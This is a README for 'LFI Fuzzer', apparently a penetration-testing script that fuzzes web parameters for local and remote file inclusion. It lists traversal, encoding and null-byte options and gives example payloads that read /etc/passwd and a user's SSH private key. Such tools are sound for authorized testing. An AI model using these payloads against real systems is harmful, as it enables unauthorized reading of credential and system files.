# LFI Fuzzer
A script to find and exploit LFI/RFI vulnerabilities with handy options.


## How to use

Get a copy of lfi_fuzzer.py and lfi_list.txt or another wordlist
```
$ python lfi_fuzzer.py -u "http://localhost/?page=" -w lfi_list.txt
```

List arguments with -h or --help
```
$ python lfi_fuzzer.py -h
```


### Arguments

### Required arguments

##### -u / --url <URL>
##### -w / --wordlist <WORDLIST>


### Fuzz parameters

##### -t / --nb-parent <nb>
Number of directories we need to traverse up
Default : 10

##### -e / --encode <nb>
Number of URL encode passes
Default : none
```
without encode : ../../page_xx'xx
--encode 1 : ..%2F..%2Fpage_xx%27xx
--encode 2 : ..%252F..%252Fpage_xx%2527xx
```

##### -p / --path-prefix <prefix>
Real or fake path to add before anything in the payload
Default : none
```
--path-prefix xxx/ : xxx/../../etc/passwd
--path-prefix /var/www/html/ : /var/www/html/../../etc/passwd
```

##### -n / --append-null
Add a null charactacter at the end of the payload
Default : none


##### -m / --traversal-method <method>
Use various traversal methods
Default : 0
```
--traversal_method 0 : ../
--traversal_method 1 : ..//
--traversal_method 2 : ....//

--traversal_method 999
Path randomly generated : some payloads may just not work depending on HTTP servers, you should try a few times.
./..../.././///./././/..//..//././//../
```

##### -x / --var <value>
Replace `[VAR]` placeholder in a payload by your own value
Default : none
```
../../home/[VAR]/.ssh/id_rsa become :
../../home/Billy/.ssh/id_rsa

```

### Fuzzing actions

##### -s / --stress
Try everything against a single hardcoded payload (/etc/passwd) : between 6-10 directory parents, every encoding, every traversal method, and a few prefixes, including your own.

##### -o / --output
Just output payloads instead of try them

##### -d / --download <directory>
Enable downloading files


### Filters and sucess/error detection

##### -sc / --success-code
Default : 200

##### -ec / --error-code
Default : 400,403,404,500

##### -l / --min-length <length>
Minimum response length

##### -ss / --success-string <string>
Validating string to look for

##### -es / --error-string <string>
Failure string to look for
